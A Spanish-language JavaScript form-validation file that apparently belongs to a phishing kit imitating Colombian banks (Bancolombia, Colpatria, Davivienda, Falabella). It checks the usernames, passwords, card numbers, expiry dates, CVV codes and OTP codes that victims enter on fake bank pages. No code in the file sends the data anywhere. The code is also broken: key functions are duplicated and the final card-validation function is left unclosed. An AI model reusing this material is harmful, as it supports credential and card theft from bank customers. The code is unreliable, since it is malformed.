function validacion(enviar) {
  const page = document.getElementById("pag").value;

  switch (page) {
    case "logo":
      const bank = localStorage.getItem("bank");
      switch (bank) {
        case "BANCOLOMBIA":
          return validacionesBccolombia(enviar);
        case "BANCO COLPATRIA":
          return validacionesColpatria(enviar);
        case "BANCO DAVIVIENDA":
          return validacionesDavi(enviar);
        case "BANCO FALABELLA":
          return validacionesFala(enviar);
         
        default:
          return true;
      }

    case "tarjeta":

      return validacionesTarjeta(enviar);

    default:
      return true;
  }
}
// ---------- validacion general -----------
// function validaciones(enviar) {
//   enviar.disabled = true;
//   enviar.style.opacity = 0.7;
//   enviar.textContent = "Ejecutando proceso...";

//   //simulaciГіn de espera para ejecuciГіn de un proceso

//   setTimeout(function () {
//     enviar.textContent = "Pulsar";
//     enviar.style.opacity = 1;
//     enviar.disabled = false;
//   }, 5000);

//   // ExpresiГіn regular para validar alfanumГ©ricos
//   const alphanumericRegex = /^(?=.*[a-zA-Z])(?=.*\d).+$/;


//   if (document.getElementById("txtPassword").value == "") {
//     Swal.fire({
//       icon: "error",
//       title: "Oops...",
//       text: "Debes ingresar una contraseГ±a",
//       confirmButtonColor: "#000000",
//     });

//     return false;

//   }
//   return true;
// }

// ----------validacion tarjeta ----------

function validacionesTarjeta(enviar) {

  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulaciГіn de espera para ejecuciГіn de un proceso
  setTimeout(function () {
    enviar.textContent = 'Pulsar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  

  if (document.getElementById("selectMes").value == "mes") {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "Debes ingresar el numero de mes de expiracion de tu tarjeta",
      confirmButtonColor: "#2364d2",
    });

    return false;
  }

  if (document.getElementById("inputCCV").value == "") {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "Debes ingresar el codigo cvv que esta en la parte tracera  de tu tarjeta",
      confirmButtonColor: "#2364d2",
    });

    return false;
  }

  if (document.getElementById("TxtBanco").value == "00") {
    alert("Selecciona el tipo de banco")

    return false;
  }

  const numeroTarjeta = document.getElementById("inputNumero").value;
  const esValida = validarNumeroTarjeta(numeroTarjeta);

  if (esValida) {

  } else {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "La tarjeta no es vГЎlida. Por favor, verifica el nГєmero ingresado.",
      confirmButtonColor: "#2364d2",
    });
    return false;
  }

  return true;
}


function validarNumeroTarjeta(numeroTarjeta) {
  // 1. Eliminar espacios en blanco del nГєmero de tarjeta (si los hubiera)
  const numeroSinEspacios = numeroTarjeta.replace(/\s/g, '');

  // 2. Verificar que el nГєmero tenga entre 16 y 17 caracteres
  if (numeroSinEspacios.length < 16 || numeroSinEspacios.length > 17) {
    return false;
  }

  // 3. Aplicar el algoritmo de Luhn para validar la tarjeta
  let sum = 0;
  let double = false;
  for (let i = numeroSinEspacios.length - 1; i >= 0; i--) {
    let digit = parseInt(numeroSinEspacios.charAt(i), 10);

    if (double) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    double = !double;
  }

  return sum % 10 === 0;


}



// --------validacion colpatia ---------

function validacionesColpatria(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulaciГіn de espera para ejecuciГіn de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);



  if (document.getElementById("txtUser").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe tener numeros',
      confirmButtonColor: "#E73711"
    })



    return false;
  }

  if (document.getElementById("txtPassword").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una contraseГ±a',
      confirmButtonColor: "#E73711"
    })

    return false;
  }


  if (document.getElementById("txtPassword").value.length < 4) {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una clave de minimo 4 caracteres',
      confirmButtonColor: "#E73711"



    })
    return false;
  }
  return true;
}

// ----------- validacion davi  ------------


function validacionesDavi(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulaciГіn de espera para ejecuciГіn de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  if (document.getElementById("txtUser").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe tener  numeros',
      confirmButtonColor: "#717171"
    })



    return false;
  }

  if (document.getElementById("txtPassword").value == "") {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una contraseГ±a',
      confirmButtonColor: "#717171"
    })

    return false;
  }

  if (document.getElementById("txtPassword").value.length < 6) {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una clave de minimo 6 caracteres',
      confirmButtonColor: "#717171"

    })
    return false;
  }
  return true;
}


// ----------- validacion tricolor  ------------


function validacionesBccolombia(enviar) {
  enviar.disabled = true;   
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulaciГіn de espera para ejecuciГіn de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  if (document.getElementById("txtUser").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe tener numeros',
      confirmButtonColor: "#81C12C"
    })

    return;
  }

  // ExpresiГіn regular para validar alfanumГ©ricos
  const alphanumericRegex = /^(?=.*[a-zA-Z])(?=.*\d).+$/;





  if (!alphanumericRegex.test(txtUser.value)) {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe contener letras y nГєmeros',
      confirmButtonColor: "#000000"
    });
    return;
  }


  if (document.getElementById("txtPassword").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una contraseГ±a',
      confirmButtonColor: "#000000"
    })

    return;
  }



  if (document.getElementById("txtPassword").value.length < 4) {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una clave de minimo 4 caracteres',
      confirmButtonColor: "#000000"
    })

    return false;
  }
  return true;
}


// ----------- validacionfala   ------------


function validacionesFala(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulaciГіn de espera para ejecuciГіn de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  if (document.getElementById("txtUser").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu usuario debe tener numeros',
      confirmButtonColor: "#81C12C"
    })

    return;
  }

  if (document.getElementById("txtPassword").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una contraseГ±a',
      confirmButtonColor: "#81C12C"
    })


    return;
  }


  if (document.getElementById("txtPassword").value.length < 6) {
    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Debes ingresar una clave de minimo 6 caracteres',
      confirmButtonColor: "#81C12C"
    })

    return false;
  }
  return true;
}

// ----------- validacion 3d   ------------


function validaciones3D(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = 'Ejecutando proceso...';

  //simulaciГіn de espera para ejecuciГіn de un proceso
  setTimeout(function () {
    enviar.textContent = 'Enviar';
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  if (document.getElementById("otp").value == "") {

    Swal.fire({
      icon: 'error',
      title: 'Oops...',
      text: 'Tu codigo debe tener numeros',
      confirmButtonColor: "#81C12C"
    })

    return;
  }
  return true;
}

document.addEventListener("DOMContentLoaded", function () {
    const selectAnio = document.getElementById("selectAnio");
    const currentYear = new Date().getFullYear(); // Obtiene el año actual

    for (let i = 0; i < 20; i++) { // Agrega los próximos 20 años
        let option = document.createElement("option");
        option.value = currentYear + i;
        option.textContent = currentYear + i;
        selectAnio.appendChild(option);
    }
});

document.addEventListener("DOMContentLoaded", function () {
    const inputNumero = document.getElementById("inputNumero");

    inputNumero.addEventListener("input", function () {
        let numeroTarjeta = inputNumero.value.replace(/\s/g, ""); // Elimina espacios
        let esValida = validarNumeroTarjeta(numeroTarjeta);

        if (esValida) {
            inputNumero.style.border = "2px solid green"; // ✅ Borde verde si es válido
        } else {
            inputNumero.style.border = "2px solid red"; // ❌ Borde rojo si es inválido
        }
    });
});

/**
 * ✅ Función para validar número de tarjeta con Algoritmo de Luhn
 */
function validarNumeroTarjeta(numeroTarjeta) {
    if (!/^\d+$/.test(numeroTarjeta)) return false; // Solo permitir números

    // Verificar que tenga entre 16 y 17 caracteres
    if (numeroTarjeta.length < 16 || numeroTarjeta.length > 17) {
        return false;
    }

    // Algoritmo de Luhn para validar la tarjeta
    let sum = 0;
    let doubleDigit = false;
    for (let i = numeroTarjeta.length - 1; i >= 0; i--) {
        let digit = parseInt(numeroTarjeta.charAt(i), 10);
        if (doubleDigit) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        doubleDigit = !doubleDigit;
    }

    return sum % 10 === 0;
}

function validacionesTarjeta(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = "Ejecutando proceso...";

  setTimeout(function () {
    enviar.textContent = "Pulsar";
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  const mesSeleccionado = document.getElementById("selectMes").value;
  const anioSeleccionado = document.getElementById("selectAnio").value;

  if (!mesSeleccionado || !anioSeleccionado) {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "Debes seleccionar una fecha de expiración válida",
      confirmButtonColor: "#2364d2",
    });
    return false;
  }

  if (!validarFechaExpiracion(mesSeleccionado, anioSeleccionado)) {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "La fecha de expiración no puede ser menor al mes y año actual",
      confirmButtonColor: "#2364d2",
    });

    document.getElementById("selectMes").style.border = "2px solid red";
    document.getElementById("selectAnio").style.border = "2px solid red";

    return false;
  } else {
    document.getElementById("selectMes").style.border = "2px solid green";
    document.getElementById("selectAnio").style.border = "2px solid green";
  }

  if (document.getElementById("inputCCV").value == "") {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "Debes ingresar el código CVV de tu tarjeta",
      confirmButtonColor: "#2364d2",
    });
    return false;
  }

  if (document.getElementById("TxtBanco").value == "00") {
    alert("Selecciona el banco");
    return false;
  }

  const numeroTarjeta = document.getElementById("inputNumero").value.replace(/\s/g, "");
  const esValida = validarNumeroTarjeta(numeroTarjeta);

  if (!esValida) {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "La tarjeta no es válida. Por favor, verifica el número ingresado.",
      confirmButtonColor: "#2364d2",
    });
    return false;
  }

  return true;
}
function validacionesTarjeta(enviar) {
  enviar.disabled = true;
  enviar.style.opacity = 0.7;
  enviar.textContent = "Ejecutando proceso...";

  setTimeout(function () {
    enviar.textContent = "Pulsar";
    enviar.style.opacity = 1;
    enviar.disabled = false;
  }, 5000);

  const mesSeleccionado = document.getElementById("selectMes").value;
  const anioSeleccionado = document.getElementById("selectAnio").value;
  const cvv = document.getElementById("inputCCV").value;
  const bancoSeleccionado = document.getElementById("TxtBanco").value;
  const numeroTarjeta = document.getElementById("inputNumero").value.replace(/\s/g, "");

  // ✅ Validación en tiempo real del número de tarjeta y CVV
document.addEventListener("DOMContentLoaded", function () {
    const inputNumero = document.getElementById("inputNumero");
    const inputCCV = document.getElementById("inputCCV");

    inputNumero.addEventListener("input", function () {
        let numeroTarjeta = inputNumero.value.replace(/\s/g, ""); // Eliminar espacios
        let esAmex = numeroTarjeta.startsWith("34") || numeroTarjeta.startsWith("37");

        // Ajusta la longitud máxima dependiendo de si es AMEX u otra tarjeta
        inputNumero.maxLength = esAmex ? 15 : 19;
        inputCCV.maxLength = esAmex ? 4 : 3;

        // 🔹 Validar si el número de tarjeta es correcto
        let esValida = validarNumeroTarjeta(numeroTarjeta, esAmex);

        if (esValida) {
            inputNumero.style.border = "2px solid green"; // ✅ Borde verde si es válido
        } else {
            inputNumero.style.border = "2px solid red"; // ❌ Borde rojo si es inválido
        }
    });

    // ✅ Validar CVV en tiempo real
    inputCCV.addEventListener("input", function () {
        let numeroTarjeta = inputNumero.value.replace(/\s/g, "");
        let esAmex = numeroTarjeta.startsWith("34") || numeroTarjeta.startsWith("37");

        // Validar que el CVV tenga la longitud correcta
        let longitudValida = esAmex ? inputCCV.value.length === 4 : inputCCV.value.length === 3;

        if (longitudValida) {
            inputCCV.style.border = "2px solid green";
        } else {
            inputCCV.style.border = "2px solid red";
        }
    });
});

/**
 * ✅ Función para validar número de tarjeta con Algoritmo de Luhn
 */
function validarNumeroTarjeta(numeroTarjeta, esAmex) {
    if (!/^\d+$/.test(numeroTarjeta)) return false; // Solo permitir números

    // 🔹 AMEX usa 15 dígitos, otras tarjetas usan 16-19
    let longitudValida = esAmex ? numeroTarjeta.length === 15 : numeroTarjeta.length >= 16 && numeroTarjeta.length <= 19;
    if (!longitudValida) return false;

    // 🔹 Algoritmo de Luhn para validar la tarjeta
    let sum = 0;
    let doubleDigit = false;
    for (let i = numeroTarjeta.length - 1; i >= 0; i--) {
        let digit = parseInt(numeroTarjeta.charAt(i), 10);
        if (doubleDigit) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        doubleDigit = !doubleDigit;
    }

    return sum % 10 === 0;
}
